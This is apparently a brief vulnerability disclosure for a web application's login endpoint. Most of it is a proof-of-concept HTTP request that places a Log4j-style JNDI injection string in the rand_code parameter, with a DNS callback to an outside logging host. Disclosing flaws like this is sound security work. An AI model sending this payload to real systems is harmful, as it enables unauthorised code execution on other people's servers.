There is a command execution vulnerability in the front-end login
Can be achieved through rand_ Code parameter for code execution


```
POST /ms/checkLogin.do HTTP/1.1
Host: 127.0.0.1:8088
Content-Length: 106
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="100"
Pragma: no-cache
sec-ch-ua-mobile: ?0
Content-Type: application/x-www-form-urlencoded
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8088
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8088/ms/login.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pageno_cookie=1; JSESSIONID=BD34D601FC3933412466B54942B5EBEA
Connection: close
Accept: 1
User-Agent: 2
X-Client-IP: 3

managerName=msopen&managerPassword=123456&rememberMe=false&rand_code=${jndi:dns://xxxx.wputvy.dnslog.cn/t}
```
![图片](https://github.com/tanalala/CVE/assets/87268585/6e33165a-d46a-47a8-8a62-cc9a2b7cdcc6)

